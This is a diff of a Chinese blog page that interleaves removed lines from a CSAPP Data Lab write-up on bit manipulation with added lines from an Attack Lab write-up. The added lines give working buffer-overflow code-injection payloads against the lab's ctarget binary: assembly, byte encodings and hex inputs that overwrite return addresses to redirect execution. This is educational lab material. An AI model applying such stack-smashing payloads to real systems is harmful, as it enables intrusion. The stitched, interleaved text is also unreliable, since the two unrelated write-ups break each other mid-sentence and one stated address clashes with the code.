-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> flag = x &gt;&gt; <span class="number">31</span>;</span><br><span class="line">x = ((~flag) &amp; x) | (flag &amp; (~x));</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>利用二分的思想，先考虑高16位：</p>
-<p><strong>0001 1000 1100 0000 | 0000 0100 1000 0000</strong></p>
-<p>将 x 右移16位 x &#x3D; x &gt;&gt; 16 ：</p>
-<p><strong>0000 0000 0000 0000 | 0001 1000 1100 0000</strong></p>
-<p>进行规格化处理 x &#x3D; !! x：</p>
-<p><strong>0000 0000 0000 0000 | 0000 0000 0000 0001</strong></p>
-<p>若高 16 位有 1，处理后的 x &#x3D; 0x00000001。需要的位数至少为 16，引入变量 bit_16 记录该权重。怎么做呢？将处理后的 x 左移 4 位即可</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> bit_16 = (!!(x &gt;&gt; <span class="number">16</span>)) &lt;&lt; <span class="number">4</span>; </span><br></pre></td></tr></table></figure>
-</li>
-<li><p>如果高 16 位有 1 ，则将 x 右移 16 位，对右移后的 x 的低 16 位中的高 8 位进行同样的操作，从而二分地在 x 的高16位中找到最大位的 1 ；如果高 16 位没有 1 ，则 x 无需右移， 在 x 的低 16 位中的高 8 位进行同样的操作。</p>
-<p>由此可得右移操作：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">x = x &gt;&gt; bit_16;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>同理，分别对高 8 位，4位，2位，1位进行检查，检查后进行同样的操作。</p>
-</li>
-<li><p>最后将所有权重求和，便是最终结果</p>
-</li>
-</ol>
-<p><strong>举例</strong></p>
 <ul>
-<li><p>设 x &#x3D; 1101 1000 1100 0000 | 0000 0100 1000 0000</p>
-</li>
-<li><p>负数取反：y &#x3D; 0010 0111 0011 1111 | 1111 1011 0111 1111</p>
-</li>
-<li><p>高16位右移：y &#x3D; 0000 0000 0000 0000 | 0010 0111 0011 1111</p>
-</li>
-<li><p>规格化：y &#x3D; 0000 0000 0000 0000 | 0000 0000 0000 0001</p>
-</li>
-<li><p>bit_16 处理：bit_16 &#x3D; y &lt;&lt; 4 &#x3D; 16  &#x2F;&#x2F;说明 x 至少需要 16 位</p>
-</li>
-<li><p>x 右移：x &#x3D; x &gt;&gt; bit_16 &#x3D; 0000 0000 0000 0000 | 0010 0111 0011 1111</p>
-</li>
-<li><p>低 16 位中的高 8 位右移：y &#x3D; 0000 0000 0000 0000 | 0000 0000 | 0010 0111</p>
-</li>
-<li><p>规格化：y &#x3D; 0000 0000 0000 0000 | 0000 0000 | 0000 0001</p>
-</li>
-<li><p>bit_8 处理：bit_8 &#x3D; y &lt;&lt; 3 &#x3D; 8 &#x2F;&#x2F;说明 x 又需要 8 位</p>
-</li>
-<li><p>x 右移：x &#x3D; x &gt;&gt; bit_8 &#x3D; 0000 0000 0000 0000 | 0000 0000 | 0010 0111</p>
-</li>
-<li><p>低 8 位的高 4 位右移：y &#x3D; 0000 0000 0000 0000 | 0000 0000 | 0000 | 0010</p>
-</li>
-<li><p>规格化：y &#x3D; 0000 0000 0000 0000 | 0000 0000 | 0000 | 0001</p>
-</li>
-<li><p>bit_4 处理：bit_4 &#x3D; y &lt;&lt; 2 &#x3D; 4 &#x2F;&#x2F;说明 x 又需要 4 位</p>
-</li>
-<li><p>x 右移：x &#x3D; x &gt;&gt; bit_4 &#x3D; 0000 0000 0000 0000 | 0000 0000 | 0000 | 0010</p>
-</li>
-<li><p>低 4 位的高 2 位右移：y &#x3D; 0000 0000 0000 0000 | 0000 0000 | 0000 | 00 | 00</p>
-</li>
-<li><p>规格化：y &#x3D; 0000 0000 0000 0000 | 0000 0000 | 0000 | 00 | 00</p>
-</li>
-<li><p>bit_2 处理：bit_2 &#x3D; y &lt;&lt; 1 &#x3D; 0 &#x2F;&#x2F;说明 x 这 4 位中的 1 在低 2 位中 </p>
-</li>
-<li><p>x 右移：x &#x3D; x &gt;&gt; bit_2 &#x3D; 0000 0000 0000 0000 | 0000 0000 | 0000 | 00 | 10 &#x2F;&#x2F;不移动</p>
-</li>
-<li><p>低 2 位的高 1 位右移：y &#x3D; 0000 0000 0000 0000 | 0000 0000 | 0000 | 00 | 0 | 1</p>
-</li>
-<li><p>规格化：y &#x3D; 0000 0000 0000 0000 | 0000 0000 | 0000 | 00 | 0 | 1</p>
-</li>
-<li><p>bit_1 处理：bit_1 &#x3D; y &lt;&lt; 0 &#x3D; 1 &#x2F;&#x2F;说明 x 又需要1位 </p>
-</li>
-<li><p>x 右移：x &#x3D; x &gt;&gt; bit_1 &#x3D; 0000 0000 0000 0000 | 0000 0000 | 0000 | 00 | 0 | 1 &#x2F;&#x2F;不移动</p>
-</li>
-<li><p>bit_0 处理：bit_0 &#x3D; x &#x3D; 1</p>
-</li>
-<li><p>bit_8 + bit_4 + bit_2 + bit_1 + bit_0 + 1&#x3D; 31 与正确答案符合！</p>
-</li>
+<li><code>./hex2raw &lt; ctarget01.txt</code>是利用<code>hex2raw</code>工具将我们的输入看作字节级的十六进制表示进行转化，用来生成攻击字符串</li>
+<li><code>|</code>表示管道，将转化后的输入文件作为<code>ctarget</code>的输入参数</li>
+<li>由于执行程序会默认连接 CMU 的服务器，<code>-q</code>表示取消这一连接</li>
 </ul>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">howManyBits</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">	<span class="type">int</span> flag = x &gt;&gt; <span class="number">31</span>;</span><br><span class="line">	x = ((~flag) &amp; x) | (flag &amp; (~x));</span><br><span class="line">	<span class="type">int</span> bit_16 = (!!(x &gt;&gt; <span class="number">16</span>)) &lt;&lt; <span class="number">4</span>; </span><br><span class="line">	x = x &gt;&gt; bit_16;</span><br><span class="line">	<span class="type">int</span> bit_8 = !!(x&gt;&gt;<span class="number">8</span>)&lt;&lt;<span class="number">3</span>;</span><br><span class="line">	x = x &gt;&gt; bit_8;</span><br><span class="line">  	<span class="type">int</span> bit_4 = !!(x &gt;&gt; <span class="number">4</span>) &lt;&lt; <span class="number">2</span>;</span><br><span class="line">  	x = x &gt;&gt; bit_4;</span><br><span class="line">  	<span class="type">int</span> bit_2 = !!(x &gt;&gt; <span class="number">2</span>) &lt;&lt; <span class="number">1</span>;</span><br><span class="line">  	x = x &gt;&gt; bit_2;</span><br><span class="line">  	<span class="type">int</span> bit_1 = !!(x &gt;&gt; <span class="number">1</span>);</span><br><span class="line">  	x = x &gt;&gt; bit_1;</span><br><span class="line">  	<span class="type">int</span> bit_0 = x;</span><br><span class="line">  	<span class="keyword">return</span> bit_16+bit_8+bit_4+bit_2+bit_1+bit_0+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220304093523423.png" alt="image-20220304093523423"></p>
+<p><strong>攻击成功！</strong></p>
+<h2 id="Phase-2"><a href="#Phase-2" class="headerlink" title="Phase 2"></a>Phase 2</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>本题结构与上题相同，不同的是调用的<code>touch2</code>函数的内容：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch2</span><span class="params">(<span class="type">unsigned</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">	vlevel = <span class="number">2</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">	<span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">		validate(<span class="number">2</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">		fail(<span class="number">2</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+<p>不仅需要修改返回地址调用<code>touch2</code>函数，还需要把<code>cookie</code>作为参数传进去。题目建议我们不使用<code>jmp</code>和<code>call</code>指令进行代码跳转，也就是说，只能通过在栈中保存目标代码的地址，然后以<code>ret</code>的形式进行跳转。</p>
+<p><strong>我们先深入理解<code>ret</code>指令：</strong></p>
+<p>在CPU中有一个“PC”即程序寄存器，在 x86-64 中用<code>%rip</code>表示，它时刻指向将要执行的下一条指令在内存中的地址。而我们的<code>ret</code>指令就相当于：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop %rip</span><br></pre></td></tr></table></figure>
 
-
-<h1 id="Problem-float"><a href="#Problem-float" class="headerlink" title="Problem-float"></a>Problem-float</h1><h2 id="floatScale2"><a href="#floatScale2" class="headerlink" title="floatScale2"></a>floatScale2</h2><ul>
-<li>floatScale2 - Return bit-level equivalent of expression 2*f for</li>
-<li>floating point argument f.</li>
-<li>Both the argument and result are passed as unsigned int’s, but</li>
-<li>they are to be interpreted as the bit-level representation of</li>
-<li>single-precision floating point values.</li>
-<li>When argument is NaN, return argument</li>
-<li>Legal ops: Any integer&#x2F;unsigned operations incl. ||, &amp;&amp;. also if, while</li>
-<li>Max ops: 30</li>
-</ul>
-<p>先分别取符号 s，尾数 frac，和阶码 exp</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> s = (uf &gt;&gt; <span class="number">31</span>) &amp; <span class="number">0x1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="built_in">exp</span> = (uf &gt;&gt; <span class="number">23</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line"><span class="type">unsigned</span> frac = (uf &amp; <span class="number">0x7FFFFF</span>);</span><br></pre></td></tr></table></figure>
-
-<ol>
-<li><p>非规格化的</p>
-<p>此时，exp &#x3D;&#x3D; 0，由于此时 frac 就是尾码，直接 frac &lt;&lt; 1 即可</p>
-</li>
-<li><p>规格化的 </p>
-<p>此时，exp!&#x3D;0 &amp;&amp; ！&#x3D;255，exp ++即可</p>
-</li>
-<li><p>特殊值</p>
-<p>根据题目要求，返回 uf</p>
-</li>
-</ol>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="title function_">floatScale2</span><span class="params">(<span class="type">unsigned</span> uf)</span> &#123;</span><br><span class="line">	<span class="type">unsigned</span> s = (uf &gt;&gt; <span class="number">31</span>) &amp; <span class="number">0x1</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="built_in">exp</span> = (uf &gt;&gt; <span class="number">23</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">	<span class="type">unsigned</span> frac = (uf &amp; <span class="number">0x7FFFFF</span>);</span><br><span class="line">	<span class="comment">//NaN</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">exp</span> == <span class="number">0xFF</span>) </span><br><span class="line">		<span class="keyword">return</span> uf;</span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">exp</span> == <span class="number">0</span>)&#123;</span><br><span class="line">		frac &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">return</span> (s &lt;&lt; <span class="number">31</span>) | (<span class="built_in">exp</span> &lt;&lt; <span class="number">23</span>) | frac;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//else</span></span><br><span class="line">	<span class="built_in">exp</span>++;</span><br><span class="line">	<span class="keyword">return</span> (s &lt;&lt; <span class="number">31</span>) | (<span class="built_in">exp</span> &lt;&lt; <span class="number">23</span>) | frac;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="floatFloat2Int"><a href="#floatFloat2Int" class="headerlink" title="floatFloat2Int"></a>floatFloat2Int</h2><ul>
-<li>floatFloat2Int - Return bit-level equivalent of expression (int) f</li>
-<li>for floating point argument f.</li>
-<li>Argument is passed as unsigned int, but</li>
-<li>it is to be interpreted as the bit-level representation of a</li>
-<li>single-precision floating point value.</li>
-<li>Anything out of range (including NaN and infinity) should return0x80000000u.</li>
-<li>Legal ops: Any integer&#x2F;unsigned operations incl. ||, &amp;&amp;. also if, while</li>
-<li>Max ops: 30</li>
-</ul>
-<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220211212931907.png" alt="iEEE"></p>
-<p>与上题一样，先取符号 s，尾数 frac，和阶码 exp</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> s = (uf &gt;&gt; <span class="number">31</span>) &amp; <span class="number">0x1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="built_in">exp</span> = (uf &gt;&gt; <span class="number">23</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line"><span class="type">unsigned</span> frac = (uf &amp; <span class="number">0x7FFFFF</span>);</span><br></pre></td></tr></table></figure>
-
-<ol>
-<li><p>非规格化的</p>
-<p>此时，exp &#x3D;&#x3D; 0，而 E &#x3D; 1 - Bias &#x3D; 1 - 127 &#x3D; -126, M &lt; 1。显然，return 0</p>
-</li>
-<li><p>规格化的 </p>
-<p>此时，exp!&#x3D;0 &amp;&amp; exp！&#x3D;255。我们把 frac 作为基数进行修改，最后返回 frac 。首先由于这是规格化的，所以要加上开头的“1”。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> E = <span class="built_in">exp</span> - <span class="number">127</span>;</span><br><span class="line">frac = frac | (<span class="number">1</span> &lt;&lt; <span class="number">23</span>);</span><br></pre></td></tr></table></figure>
-
-<p>$$<br>V &#x3D; (-1)^s\times M\times2^E<br>$$</p>
+<p>即把栈中存放的地址弹出作为下一条指令的地址。</p>
+<p>于是，利用<code>push</code>和<code>ret</code>就能实现我们的指令转移啦！</p>
+<p>思路如下：</p>
 <ul>
-<li><p>当 E &lt; 0 时，显然 V &lt; 1, return 0</p>
+<li><p>首先，通过字符串输入把<code>caller</code>的栈中储存的返回地址改为注入代码的存放地址</p>
 </li>
-<li><p>frac 为 23 位，若 E &gt; 23, 则进行加权时，能在 frac 的末尾添加 (E - 23) 个 0</p>
-</li>
-<li><p>若 E &lt; 23, 则 frac 末尾的 (23 - E)个数无法保留</p>
-</li>
-<li><p>若 E &gt;&#x3D; 31, 显然为 infinity ，return 0x80000000u</p>
-</li>
-</ul>
-</li>
-<li><p>特殊值 exp &#x3D;&#x3D; 0xFF, return  0x80000000u</p>
-</li>
-<li><p>还要注意考虑负数的情况，根据 s 的值进行判断，最后利用我们前面用到的取负技巧即可。</p>
-</li>
-</ol>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">floatFloat2Int</span><span class="params">(<span class="type">unsigned</span> uf)</span> &#123;</span><br><span class="line">	<span class="type">unsigned</span> s = (uf &gt;&gt; <span class="number">31</span>) &amp; <span class="number">0x1</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="built_in">exp</span> = (uf &gt;&gt; <span class="number">23</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">	<span class="type">unsigned</span> frac = (uf &amp; <span class="number">0x7FFFFF</span>);</span><br><span class="line">	<span class="type">int</span> E = <span class="built_in">exp</span> - <span class="number">127</span>;</span><br><span class="line">	frac = frac | (<span class="number">1</span> &lt;&lt; <span class="number">23</span>);</span><br><span class="line">	<span class="keyword">if</span>(E &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(E &gt;= <span class="number">31</span>) <span class="keyword">return</span> <span class="number">0x1</span> &lt;&lt; <span class="number">31</span>;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(E&lt;<span class="number">23</span>) &#123;</span><br><span class="line">            frac&gt;&gt;=(<span class="number">23</span> - E);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            frac &lt;&lt;= (E - <span class="number">23</span>);</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (s)</span><br><span class="line">        <span class="keyword">return</span> ~frac + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> frac;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="floatPower2"><a href="#floatPower2" class="headerlink" title="floatPower2"></a>floatPower2</h2><ul>
-<li>floatPower2 - Return bit-level equivalent of the expression 2.0^x</li>
-<li>(2.0 raised to the power x) for any 32-bit integer x.</li>
-<li>The unsigned value that is returned should have the identical bit</li>
-<li>representation as the single-precision floating-point number 2.0^x.</li>
-<li>If the result is too small to be represented as a denorm, return 0</li>
-<li>If too large, return +INF.</li>
-<li>Legal ops: Any integer&#x2F;unsigned operations incl. ||, &amp;&amp;. Also if, while </li>
-<li>Max ops: 30</li>
-</ul>
-<p>要做这道题，首先要导出浮点数非规格化和规格化分别表示的浮点数的范围。</p>
-<ol>
-<li><p>非规格化的</p>
-<p>此时，E &#x3D; 1 - Bias &#x3D; 1 - 127 &#x3D; -126, 而$M_{min} &#x3D; 0.00\dots1 &#x3D; 2^{-23}$, 所以非规格化浮点最小为 $2^{-23}\times 2^{-126} &#x3D; 2^{-149}$, $M_{max}&#x3D;2^{-1}+2^{-2}+\dots +2^{-23} &#x3D; 1-2^{-23}$, 所以非规格化浮点最大为 $2^{-126}\times (1-2^{-23})$</p>
-</li>
-<li><p>规格化的</p>
-<p>$M_{min} &#x3D; 1$,  $E_{min} &#x3D; 1-127&#x3D;-126$ 所以规格化的最小为$2^{-126}$</p>
-<p>$M_{max}&#x3D;1.11\dots11$, $E_{MINT}&#x3D;1111\quad1110&#x3D;2^{127}$ 所以规格化最大为不到$2^{128}$</p>
-</li>
-</ol>
-<p>可得下表：</p>
-<table>
-<thead>
-<tr>
-<th align="center">格式</th>
-<th align="center">最小值</th>
-<th align="center">最大值</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">规格化</td>
-<td align="center">$2^{-126}$</td>
-<td align="center">$2^{127}\times (2-2^{-23})$</td>
-</tr>
-<tr>
-<td align="center">非规格化</td>
-<td align="center">$2^{-149}$</td>
-<td align="center">$2^{-126}\times (1-2^{-23})$</td>
-</tr>
-</tbody></table>
-<p>所以：</p>
+<li><p>然后，编写代码。我们的代码应该完成哪些工作呢？</p>
 <ul>
-<li>x &gt; 127 时，返回 Nan</li>
-<li>x &lt;&#x3D; -149时，返回 0</li>
-<li>-126&lt;&#x3D; x &lt;&#x3D;127 时，为规格化的。直接让尾码为全0，控制阶码即可，由 x &#x3D; expr - bias &#x3D;&gt; exp &#x3D; x + 127</li>
-<li>-149 &lt; x &lt; -126 时，为非规格化的，阶码值为 E &#x3D; 1 - bias &#x3D; -126。这时候只能通过控制尾码来计算。由</li>
+<li>查看<code>cookie</code>值为<code>0x59b997fa</code>，先将第一个参数寄存器修改为该值</li>
+<li>在栈中压入<code>touch2</code>代码地址</li>
+<li><code>ret</code>指令调用返回地址也就是<code>touch2</code></li>
 </ul>
-<p>$$<br>M\times2^{-126}&#x3D;2^x<br>$$</p>
-<p>知尾码的值是二次幂的形式，所以，尾码的值一定是通过一个“1”左移得到的。尾码各位以2的次幂形式的权值如下</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/v2-833086860fc45c1b4d6a75121185efdd_720w.jpg" alt="img"></p>
-<p>设1左移n位，则 x+126 &#x3D; -(23 - n)，得 n &#x3D; x + 149</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="title function_">floatPower2</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">	<span class="keyword">if</span>(x &lt; <span class="number">-149</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(x &lt; <span class="number">-126</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span> &lt;&lt; (x + <span class="number">149</span>);</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(x &lt;= <span class="number">127</span>)</span><br><span class="line">		<span class="keyword">return</span> (x + <span class="number">127</span>) &lt;&lt; <span class="number">23</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> (<span class="number">0xFF</span>) &lt;&lt; <span class="number">23</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>确定注入代码的地址。代码应该存在<code>getbuf</code>分配的栈中，地址为<code>getbuf</code>函数中的栈顶</p>
+</li>
+</ul>
+<h3 id="注入代码"><a href="#注入代码" class="headerlink" title="注入代码"></a>注入代码</h3><p>查到<code>touch2</code>代码地址为：<code>0x4017c0</code>，由上述思路，得代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movq    $0x59b997fa, %rdi</span><br><span class="line">pushq   $0x4017ec</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
 
-<h1 id="完结纪念："><a href="#完结纪念：" class="headerlink" title="完结纪念："></a>完结纪念：</h1><p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220211234650758.png" alt="btest"></p>
+<p>利用<code>gdb</code>在<code>getbuf</code>分配栈帧后打断点，查看栈顶指针的位置</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220304175128141.png" alt="image-20220304175128141"></p>
+<p><code>0x5561dc78</code>这就是我们应该修改的返回地址</p>
+<h3 id="栈帧讲解"><a href="#栈帧讲解" class="headerlink" title="栈帧讲解"></a>栈帧讲解</h3><p>按照我们的思路，输入字符串后的栈帧应该是这样的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220305095954954.png" alt="image-20220305095954954"></p>
+<p>逻辑如下：</p>
+<ul>
+<li><code>getbuf</code>执行<code>ret</code>指令后，注入代码的地址从栈中弹出</li>
+<li>程序执行我们编写的代码，当再次执行<code>ret</code>后，从栈中弹出的就是我们压入的<code>touch2</code>函数的地址，成功跳转</li>
+</ul>
+<h3 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h3><p>先将我们的汇编代码保存到一个<code>.s</code>文件中，接下来利用如下指令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -c injectcode.s</span><br><span class="line">objdump -d injectcode.o &gt; injectcode.d</span><br></pre></td></tr></table></figure>
+
+<p>得到字节级表示</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi</span><br><span class="line">   7:   68 ec 17 40 00          pushq  $0x4017ec</span><br><span class="line">   c:   c3                      retq</span><br></pre></td></tr></table></figure>
+
+<p>将这段代码放到40个字节中的开头，代码地址放到末尾。于是就得到我们的输入为：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68 </span><br><span class="line">ec 17 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220304233752252.png" alt="image-20220304233752252"></p>
+<p><strong>攻击成功！</strong></p>
+<h2 id="Phase-3"><a href="#Phase-3" class="headerlink" title="Phase 3"></a>Phase 3</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>本题与上题类似，不同点在于传的参数是一个字符串。先给出<code>touch3</code>的C语言代码</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch3</span><span class="params">(<span class="type">char</span> *sval)</span></span><br><span class="line">&#123;</span><br><span class="line">	vlevel = <span class="number">3</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">	<span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">		validate(<span class="number">3</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">		fail(<span class="number">3</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>touch3</code>中调用了<code>hexmatch</code>，它的C语言代码为：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">hexmatch</span><span class="params">(<span class="type">unsigned</span> val, <span class="type">char</span> *sval)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">    <span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line">	<span class="type">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">	<span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>也就是说，我们要把<code>cookie</code>转换成对应的字符串传进去</p>
+<p>注意第6行，<code>s</code>的位置是随机的，我们写在<code>getbuf</code>栈中的字符串很有可能被覆盖，一旦被覆盖就无法正常比较。</p>
+<p>因此，考虑把<code>cookie</code>的字符串数据存在<code>test</code>的栈上，其它部分与上题相同，这里不再重复思路。</p>
+<h3 id="注入代码-1"><a href="#注入代码-1" class="headerlink" title="注入代码"></a>注入代码</h3><p>先查找<code>test</code>栈顶指针的位置：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220305094755965.png" alt="image-20220305094755965"></p>
+<p><code>0x5561dca8</code>，这就是我们字符串存放的位置，也是调用<code>touch3</code>应该传入的参数，又<code>touch3</code>代码的地址为<code>4018fa</code>。从而得到代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movq    $0x5561dca8, %rdi</span><br><span class="line">pushq   $0x4018fa</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<p>字节级表示为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi</span><br><span class="line">   7:   68 fa 18 40 00          pushq  $0x4018fa</span><br><span class="line">   c:   c3                      retq</span><br></pre></td></tr></table></figure>
+
+<h3 id="栈帧讲解-1"><a href="#栈帧讲解-1" class="headerlink" title="栈帧讲解"></a>栈帧讲解</h3><p>我们期望的栈帧应该是这样的：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220305101326911.png" alt="image-20220305101326911"></p>
+<p>逻辑如下：</p>
+<ul>
+<li><code>getbuf</code>执行<code>ret</code>，从栈中弹出返回地址，跳转到我们注入的代码</li>
+<li>代码执行，先将存在<code>caller</code>的栈中的字符串传给参数寄存器<code>%rdi</code>，再将<code>touch3</code>的地址压入栈中</li>
+<li>代码执行<code>ret</code>，从栈中弹出<code>touch3</code>指令，成功跳转</li>
+</ul>
+<h3 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h3><p>我们的cookie<code>0x59b997fa</code>作为字符串转换为<code>ASCII</code>为：<code>35 39 62 39 39 37 66 61</code></p>
+<p>注入代码段的地址与上题一样，同样为<code>0x5561dc78</code></p>
+<p>由于在<code>test</code>栈帧中多利用了一个字节存放cookie，所以本题要输入56个字节。注入代码的字节表示放在开头，33-40个字节放置注入代码的地址用来覆盖返回地址，最后八个字节存放cookie的<code>ASCII</code> 。于是得到如下输入：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68 </span><br><span class="line">fa 18 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220305102649568.png" alt="image-20220305102649568"></p>
+<p><strong>攻击成功！</strong></p>
+<p><code>Part 1</code>就此完结啦！</p>
